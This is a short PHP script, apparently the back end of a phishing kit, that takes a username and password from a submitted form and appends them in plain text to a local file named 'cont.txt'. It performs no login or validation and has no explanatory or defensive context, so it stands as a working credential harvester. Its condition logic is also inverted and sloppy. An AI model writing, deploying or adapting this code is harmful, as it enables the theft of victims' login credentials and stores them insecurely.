<?php
  
  session_start();
  
if(!isset($_POST['Submit']))
    {
    @$username = $_POST['username'];
    @$password = $_POST['password'];
    @$text = $username . "," . $password . "\n";
    $fp = fopen('cont.txt', 'a+');
	}
    if(fwrite($fp, $text))  {
        
    }
fclose ($fp);


?>

